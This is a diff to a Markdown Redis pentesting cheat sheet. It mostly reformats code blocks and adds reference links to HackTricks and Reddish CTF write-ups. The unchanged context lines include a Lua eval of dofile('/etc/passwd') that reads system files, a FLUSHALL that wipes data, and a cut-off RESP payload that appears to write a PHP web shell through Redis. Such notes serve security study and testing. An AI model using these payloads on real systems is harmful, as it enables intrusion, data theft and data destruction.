@@ -10,13 +10,15 @@ redis-cli -h $IP -p $port -a $password -n $databasenumber
 ```
 
 ## Concepts
-```redis
-info		# server info
+```sql
+info 	-- server info
+CONFIG GET * --  list of all active configuration variables you can change
+
 ```
-Keyspace section provide the main dictionary of each database
+Keyspace section is the main dictionary of each database
 
 ## Useful Commands
-```
+```sql
 select $database/$table
 keys * # all keys
 get $keyname
@@ -37,7 +39,7 @@ set user
 flushall [ASYNC | SYNC]
 ```
 
-## Exploitations
+## Exploitation
 
 ```sql
 eval dofile('/etc/passwd') 0 # enumerating files, with lua script dofile()
@@ -94,3 +96,8 @@ echo -ne '*1\r\n$8\r\nFLUSHALL\r\n*3\r\n$3\r\nSET\r\n$1\r\n1\r\n$32\r\n<?php she
 
 [Redis Commands](https://redis.io/commands/)
 [Redis RCE from packetstormsecurity](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html)
+[Lzone](https://lzone.de/cheat-sheet/Redis)
+[HackTricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)
+[alamot](https://alamot.github.io/reddish_writeup/#getting-www-data-www)
+[Redis RCE from packetstormsecurity](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html)  
+[0xdf Writeup for Reddish](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html) 
